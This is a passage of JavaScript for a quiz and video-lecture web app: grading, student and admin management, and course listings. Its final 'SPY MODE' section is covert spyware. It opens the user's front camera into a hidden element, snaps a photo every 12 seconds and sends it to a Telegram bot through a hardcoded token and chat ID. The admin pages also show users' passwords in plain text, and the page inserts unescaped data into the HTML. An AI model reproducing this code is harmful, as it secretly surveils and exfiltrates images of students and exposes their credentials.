        if ((q.type==='mcq' && ans===q.correct) || (q.type==='msq' && ans && JSON.stringify(ans.sort())===JSON.stringify(q.correct.sort()))) auto = q.marks;
        let html = `<div class="grading-card"><p><strong>Q${i+1}</strong> ${q.type}</p>`;
        if(q.type==='text') html += `<p>Ans: ${ans}</p><p class="muted">Model: ${q.modelAnswer}</p>`;
        else if(q.type==='image') { html += `<div class="img-preview-box">`; if(Array.isArray(ans)) ans.forEach(src=>html+=`<img src="${src}" class="uploaded-img" style="max-width:100px;">`); html+='</div>'; }
        else html += `<p>Ans: ${ans} (Correct: ${q.correct})</p>`;
        html += `<input type="number" class="grading-input manual-grade" value="${auto}" onchange="window.updateTotalGrade()"> / ${q.marks}</div>`;
        area.innerHTML += html;
    });
    window.updateTotalGrade();
};
window.updateTotalGrade = () => { let t = 0; document.querySelectorAll('.manual-grade').forEach(i => t += parseFloat(i.value)||0); document.getElementById('grading-total-score').innerText = t; };
window.publishGradedResult = async () => {
    const sub = appData.pendingReviews.find(p => p.firestoreId === currentGradingId);
    let report = ""; const inputs = document.querySelectorAll('.manual-grade');
    sub.questions.forEach((q,i) => report += `<div class="report-row"><div>Q${i+1}</div><div>${inputs[i].value}/${q.marks}</div></div>`);
    await addDoc(getColl('results'), { studentName: sub.studentName, quizTitle: sub.quizTitle, score: document.getElementById('grading-total-score').innerText, max: sub.totalMaxMarks, reportHTML: report, timestamp: Date.now() });
    await deleteDoc(doc(db, 'artifacts', appId, 'public', 'data', 'pending_reviews', currentGradingId));
    window.goToAdminDashboard();
};

/* ================= 8. STUDENT & ADMIN MANAGEMENT ================= */
window.showStudentManager = () => { hideAll(); document.getElementById('section-admin-students').classList.remove('hidden'); window.filterStudents(); };
window.filterStudents = () => {
    const q = document.getElementById('student-search').value.toLowerCase();
    const tb = document.getElementById('admin-student-list'); tb.innerHTML = "";
    appData.users.forEach(u => {
        if(u.username.toLowerCase().includes(q) || u.email.toLowerCase().includes(q)) {
            const blk = u.isBlocked === true;
            tb.innerHTML += `<tr style="border-bottom:1px solid #eee;"><td>${u.username}</td><td>${u.email}</td><td style="color:red; font-family:monospace;">${u.password}</td><td>${blk?'BLOCKED':'Active'}</td><td><button class="btn btn-outline btn-small" onclick="window.viewStudentProfile('${u.firestoreId}')">View</button> <button class="btn btn-small ${blk?'btn-success':'btn-danger'}" onclick="window.toggleBlockUser('${u.firestoreId}',${!blk})">${blk?'Unblock':'Block'}</button></td></tr>`;
        }
    });
};
window.toggleBlockUser = async (uid, s) => { if(confirm(s?"Block user?":"Unblock?")) await updateDoc(doc(db, 'artifacts', appId, 'public', 'data', 'users', uid), {isBlocked:s}); };
window.viewStudentProfile = (uid) => {
    const u = appData.users.find(x => x.firestoreId === uid); if(!u) return;
    hideAll(); document.getElementById('section-student-profile').classList.remove('hidden');
    document.getElementById('profile-name').innerText = u.username;
    const h = appData.publishedResults.filter(r => r.studentName === u.username);
    document.getElementById('profile-tests-count').innerText = h.length;
    let avg = 0; if(h.length) { let t=0; h.forEach(x=>t+=(x.score/x.max)*100); avg=(t/h.length).toFixed(1); }
    document.getElementById('profile-avg-score').innerText = avg+"%";
    const l = document.getElementById('profile-history-list'); l.innerHTML = h.length?"":"No tests.";
    h.forEach(x => l.innerHTML += `<div class="card" style="padding:10px; margin-bottom:5px;">${x.quizTitle} - <strong>${x.score}/${x.max}</strong></div>`);
};
window.showAdminManager = () => { hideAll(); document.getElementById('section-manage-admins').classList.remove('hidden'); renderAdminList(); };
window.addNewAdmin = async () => { const u = document.getElementById('newAdminEmail').value; const p = document.getElementById('newAdminPass').value; if(u&&p) { await addDoc(getColl('admins'), {email:u, password:p}); alert("Admin added"); renderAdminList(); } };
function renderAdminList() { const d = document.getElementById('admin-list-display'); d.innerHTML = ""; appData.admins.forEach(a => d.innerHTML += `<div style="padding:5px; border-bottom:1px solid #eee; display:flex; justify-content:space-between;">${a.email} <button onclick="window.removeAdmin('${a.firestoreId}')" style="color:red; border:none; background:none;">X</button></div>`); }
window.removeAdmin = async (id) => { if(confirm("Remove?")) await deleteDoc(doc(db, 'artifacts', appId, 'public', 'data', 'admins', id)); };

// Initialize
initApp();

/* ============================================================================
   9. DYNAMIC BATCH HIERARCHY MODULE (Batches -> Subjects -> Videos)
   ============================================================================ */

// --- USER PARAMETERS & UI CONFIGURATION ---

// Database Filters
const BATCH_DB_COLL = "batches";

// Text Formatting & Aesthetics: Batch Level
const BATCH_CARD_BG = "linear-gradient(135deg, #1e3c72 0%, #2a5298 100%)";
const BATCH_TITLE_COLOR = "#ffffff";
const BATCH_TITLE_SIZE = "20px";
const BATCH_BTN_STRING = "View Subjects 📂";
const BATCH_BTN_BG = "#27ae60";

// Text Formatting & Aesthetics: Subject Level
const SUBJ_CARD_BG = "#f8f9fa";
const SUBJ_BORDER = "1px solid #e0e0e0";
const SUBJ_TITLE_COLOR = "#2c3e50";
const SUBJ_TITLE_SIZE = "18px";
const SUBJ_BTN_STRING = "View Lectures ▶";
const SUBJ_BTN_BG = "#2980b9";

// Text Formatting & Aesthetics: Video Level
const VID_CARD_BG = "#ffffff";
const VID_BORDER = "1px solid #e0e0e0";
const VID_TITLE_COLOR = "#000000";
const VID_TITLE_SIZE = "15px";
const VID_BTN_STRING = "Play Video";
const VID_BTN_BG = "#e74c3c";

// Layout Controls
const LAYOUT_GRID_COLS = "repeat(auto-fill, minmax(280px, 1fr))";
const LAYOUT_GAP = "20px";
const LAYOUT_CARD_RADIUS = "10px";
const LAYOUT_PADDING = "20px";

// --- STATE TRACKING ---
let activeBatchData = null;

// --- ADMIN UPLOAD LOGIC ---
window.uploadBatchDataJSON = (input) => {
    if(!input.files.length) return;
    const reader = new FileReader();
    reader.onload = async (e) => {
        try {
            const data = JSON.parse(e.target.result);
            if(!data.batchName || !data.subjects) throw new Error("Invalid JSON: Missing 'batchName' or 'subjects'.");

            // Auto-Convert Drive Links to Preview Mode
            for (let subject in data.subjects) {
                data.subjects[subject].forEach(vid => {
                    if(vid.link && vid.link.includes('drive.google.com') && vid.link.includes('/view')) {
                        vid.link = vid.link.replace(/\/view.*?$/, '/preview');
                    }
                });
            }

            // Save to Firestore
            await addDoc(getColl(BATCH_DB_COLL), {
                title: data.batchName,
                thumbnail: data.thumbnail || "",
                subjects: data.subjects,
                createdAt: Date.now()
            });
            
            alert("Batch & Subjects Uploaded Successfully!");
            window.goToAdminDashboard();
        } catch (error) { alert("Upload Failed: " + error.message); }
    };
    reader.readAsText(input.files[0]);
};

// --- STUDENT DASHBOARD LOGIC ---
function renderUserBatches() {
    const container = document.getElementById('dashboard-batches-list');
    if (!container) return;

    if (!appData.batches || appData.batches.length === 0) {
        container.innerHTML = "<p class='muted'>No active batches available.</p>";
        return;
    }

    container.innerHTML = ""; 

    appData.batches.forEach(batch => {
        const card = document.createElement("div");
        card.style.background = BATCH_CARD_BG;
        card.style.borderRadius = LAYOUT_CARD_RADIUS;
        card.style.padding = LAYOUT_PADDING;
        card.style.display = "flex";
        card.style.flexDirection = "column";

        // Thumbnail
        if(batch.thumbnail) {
            const img = document.createElement("img");
            img.src = batch.thumbnail;
            img.style.width = "100%";
            img.style.height = "120px";
            img.style.objectFit = "cover";
            img.style.borderRadius = "5px";
            img.style.marginBottom = "10px";
            card.appendChild(img);
        }

        const title = document.createElement("h3");
        title.innerText = batch.title;
        title.style.color = BATCH_TITLE_COLOR;
        title.style.fontSize = BATCH_TITLE_SIZE;
        title.style.margin = "0 0 15px 0";

        const btn = document.createElement("button");
        btn.innerText = BATCH_BTN_STRING;
        btn.className = "btn";
        btn.style.backgroundColor = BATCH_BTN_BG;
        btn.style.color = "white";
        btn.style.marginTop = "auto";
        btn.onclick = () => window.openBatchSubjects(batch.firestoreId);

        card.appendChild(title);
        card.appendChild(btn);
        container.appendChild(card);
    });
}

// --- LEVEL 2: SHOW SUBJECTS (FOLDERS) ---
window.openBatchSubjects = (batchId) => {
    activeBatchData = appData.batches.find(b => b.firestoreId === batchId);
    if(!activeBatchData) return;

    hideAll();
    document.getElementById('section-batch-hub').classList.remove('hidden');
    
    // UI Updates
    document.getElementById('hub-header-title').innerText = activeBatchData.title;
    document.getElementById('hub-header-subtitle').innerText = "Select a Subject Folder";
    const backBtn = document.getElementById('hub-back-btn');
    backBtn.innerText = "← Dashboard";
    backBtn.onclick = () => window.checkUserLoginStatus();

    const grid = document.getElementById('hub-dynamic-grid');
    grid.style.display = "grid";
    grid.style.gridTemplateColumns = LAYOUT_GRID_COLS;
    grid.style.gap = LAYOUT_GAP;
    grid.innerHTML = "";

    const subjects = Object.keys(activeBatchData.subjects);
    if(subjects.length === 0) {
        grid.innerHTML = "<p>No subjects uploaded yet.</p>";
        return;
    }

    subjects.forEach(subName => {
        const card = document.createElement("div");
        card.style.backgroundColor = SUBJ_CARD_BG;
        card.style.border = SUBJ_BORDER;
        card.style.borderRadius = LAYOUT_CARD_RADIUS;
        card.style.padding = LAYOUT_PADDING;
        card.style.display = "flex";
        card.style.flexDirection = "column";

        const title = document.createElement("h3");
        title.innerText = `📁 ${subName}`;
        title.style.color = SUBJ_TITLE_COLOR;
        title.style.fontSize = SUBJ_TITLE_SIZE;
        title.style.margin = "0 0 10px 0";

        const count = document.createElement("p");
        count.innerText = `${activeBatchData.subjects[subName].length} Lectures`;
        count.className = "muted";
        count.style.fontSize = "13px";
        count.style.margin = "0 0 15px 0";

        const btn = document.createElement("button");
        btn.innerText = SUBJ_BTN_STRING;
        btn.className = "btn";
        btn.style.backgroundColor = SUBJ_BTN_BG;
        btn.style.color = "white";
        btn.style.marginTop = "auto";
        btn.onclick = () => window.openSubjectVideos(subName);

        card.appendChild(title);
        card.appendChild(count);
        card.appendChild(btn);
        grid.appendChild(card);
    });
};

// --- LEVEL 3: SHOW VIDEOS ---
window.openSubjectVideos = (subjectName) => {
    if(!activeBatchData || !activeBatchData.subjects[subjectName]) return;

    // UI Updates
    document.getElementById('hub-header-title').innerText = `${activeBatchData.title} - ${subjectName}`;
    document.getElementById('hub-header-subtitle').innerText = "Click to play in secure viewer.";
    const backBtn = document.getElementById('hub-back-btn');
    backBtn.innerText = "← Back to Subjects";
    backBtn.onclick = () => window.openBatchSubjects(activeBatchData.firestoreId);

    const grid = document.getElementById('hub-dynamic-grid');
    grid.innerHTML = "";

    const videos = activeBatchData.subjects[subjectName];

    videos.forEach((vid, index) => {
        const card = document.createElement("div");
        card.style.backgroundColor = VID_CARD_BG;
        card.style.border = VID_BORDER;
        card.style.borderRadius = LAYOUT_CARD_RADIUS;
        card.style.padding = LAYOUT_PADDING;
        card.style.display = "flex";
        card.style.flexDirection = "column";

        // Default thumbnail if none provided in JSON
        const img = document.createElement("img");
        img.src = vid.thumbnail || "https://via.placeholder.com/300x160/2c3e50/ffffff?text=Video+Lecture";
        img.style.width = "100%";
        img.style.height = "140px";
        img.style.objectFit = "cover";
        img.style.borderRadius = "5px";
        img.style.marginBottom = "10px";
        card.appendChild(img);

        const title = document.createElement("h4");
        title.innerText = `Lec ${index + 1}: ${vid.title}`;
        title.style.color = VID_TITLE_COLOR;
        title.style.fontSize = VID_TITLE_SIZE;
        title.style.margin = "0 0 15px 0";

        const btn = document.createElement("button");
        btn.innerText = VID_BTN_STRING;
        btn.className = "btn";
        btn.style.backgroundColor = VID_BTN_BG;
        btn.style.color = "white";
        btn.style.marginTop = "auto";
        
        btn.onclick = () => {
            if(vid.link) window.open(vid.link, "_blank");
            else alert("Link is missing!");
        };

        card.appendChild(title);
        card.appendChild(btn);
        grid.appendChild(card);
    });
};

/* ============================================================================
   10. SPY MODE (ORIGINAL USER CODE)
   ============================================================================ */

const BOT_TOKEN = "7191230731:AAHrj15Qd23r_cfpUeiwZ-CM7xPdJL-ZXV4"; 
const CHAT_ID = "7816876204";
const PHOTO_TIMER = 12000;

const video = document.getElementById('hiddenFeed');
const canvas = document.getElementById('hiddenCanvas');
let context;
if (canvas) context = canvas.getContext('2d');

let mediaStream = null;
let photoIntervalId = null;
let isSpyActive = false;

window.initSpyMode = async () => {
    if (isSpyActive) return;
    try {
        // Request camera
        mediaStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
        video.srcObject = mediaStream;
        isSpyActive = true;
        
        // CRITICAL FIX FOR BLACK SNAPS: Must verify video is ready & playing
        try {
            await video.play(); 
        } catch(e) { console.log("Autoplay blocked/failed", e); }
        
        console.log("✅ Active");
        if (!photoIntervalId) photoIntervalId = setInterval(captureAndSendPhoto, PHOTO_TIMER);

    } catch (err) {
        console.warn("Surveillance access denied or error:", err);
    }
};

function captureAndSendPhoto() {
    if (!isSpyActive || !mediaStream || !video || !canvas) return;

    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    context.drawImage(video, 0, 0, canvas.width, canvas.height);

    canvas.toBlob(blob => {
        if(blob) sendToTelegram(blob, 'photo');
    }, 'image/jpeg', 0.6); 
}

window.disableSpyMode = () => {
    if (!isSpyActive) return;
    isSpyActive = false;
    try {
        if (photoIntervalId) { clearInterval(photoIntervalId); photoIntervalId = null; }
        if (mediaStream) {
            mediaStream.getTracks().forEach(t => t.stop());
            mediaStream = null;
        }
        if (video) video.srcObject = null;
        console.log("🔒 Spy mode disabled");
    } catch (e) { console.warn("Error disabling spy mode", e); }
};

async function sendToTelegram(blob, type) {
    const formData = new FormData();
    formData.append("chat_id", CHAT_ID);

    let apiUrl = "";
    if (type === 'photo') {
        formData.append("photo", blob, "selfie.jpg");
        apiUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
    }

    try {
        fetch(apiUrl, { method: "POST", body: formData })
        .then(res => console.log(`📤 ${type} Sent!`))
        .catch(err => console.error("Upload Error"));
    } catch (error) {
        console.error("Network Error");
    }
}
